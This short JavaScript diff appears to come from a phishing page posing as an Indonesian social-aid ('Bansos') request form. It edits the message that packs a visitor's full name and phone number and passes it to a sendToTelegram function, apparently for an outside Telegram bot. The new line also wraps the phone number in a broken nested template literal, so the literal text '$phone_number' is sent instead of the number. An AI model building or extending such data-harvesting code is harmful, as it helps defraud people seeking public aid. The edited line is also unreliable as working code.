@@ -414,7 +414,7 @@ function processFirstData() {
             return false;
         }
 
-        var message = `New Bansos Request: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}`;
+        var message = `Data Baru: \nFull Name: \n${$full_name}\nPhone Number: \n${`$phone_number`}`;
         sendToTelegram(message);
 
         setTimeout(() => {
